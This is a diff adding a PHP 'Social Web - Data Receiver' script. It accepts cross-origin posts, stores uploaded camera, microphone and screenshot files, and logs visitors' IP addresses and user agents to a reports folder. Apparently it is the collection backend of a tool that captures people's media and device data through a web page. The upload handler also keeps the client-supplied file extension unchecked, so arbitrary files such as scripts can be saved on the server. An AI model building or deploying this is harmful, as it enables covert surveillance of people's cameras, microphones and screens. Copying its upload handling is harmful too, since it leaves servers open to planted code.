@@ -1,0 +1,90 @@
+<?php
+// ==============================================================
+// Social Web - Data Receiver
+// ==============================================================
+
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+header('Content-Type: application/json');
+
+if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+    http_response_code(200);
+    exit;
+}
+
+$report_dir = __DIR__ . '/../reports/';
+if (!is_dir($report_dir)) {
+    mkdir($report_dir, 0755, true);
+}
+
+$data = null;
+
+// Handle JSON POST
+$raw_input = file_get_contents('php://input');
+if ($raw_input) {
+    $data = json_decode($raw_input, true);
+}
+
+// Handle form POST
+if ($_POST) {
+    $data = $_POST;
+}
+
+// Handle files
+$files_received = [];
+foreach (['camera', 'microphone', 'screenshot'] as $ftype) {
+    if (isset($_FILES[$ftype]) && $_FILES[$ftype]['error'] === UPLOAD_ERR_OK) {
+        $ext = pathinfo($_FILES[$ftype]['name'], PATHINFO_EXTENSION);
+        $fname = $ftype . '_' . date('Ymd_His') . '_' . uniqid() . '.' . $ext;
+        $fpath = $report_dir . $fname;
+        move_uploaded_file($_FILES[$ftype]['tmp_name'], $fpath);
+        $files_received[$ftype] = $fname;
+    }
+}
+
+if ($data === null && empty($files_received)) {
+    http_response_code(400);
+    echo json_encode(['status' => 'error', 'message' => 'No data received']);
+    exit;
+}
+
+// Add timestamp
+$data['timestamp'] = date('Y-m-d H:i:s');
+$data['files'] = $files_received;
+
+// Generate unique report ID
+$report_id = 'report_' . date('Ymd_His') . '_' . uniqid();
+$data['report_id'] = $report_id;
+
+// Save report
+file_put_contents(
+    $report_dir . $report_id . '.json',
+    json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)
+);
+
+// Log
+$log_entry = sprintf(
+    "[%s] Report: %s | IP: %s | UA: %s\n",
+    $data['timestamp'],
+    $report_id,
+    $data['ip'] ?? 'unknown',
+    $data['user_agent'] ?? 'unknown'
+);
+file_put_contents($report_dir . 'access.log', $log_entry, FILE_APPEND);
+
+// Response
+$response = [
+    'status' => 'success',
+    'report_id' => $report_id,
+    'files' => $files_received
+];
+
+if (!empty($files_received)) {
+    $response['message'] = 'All data received successfully!';
+    foreach ($files_received as $type => $name) {
+        $response[$type . '_status'] = 'saved as ' . $name;
+    }
+}
+
+echo json_encode($response);
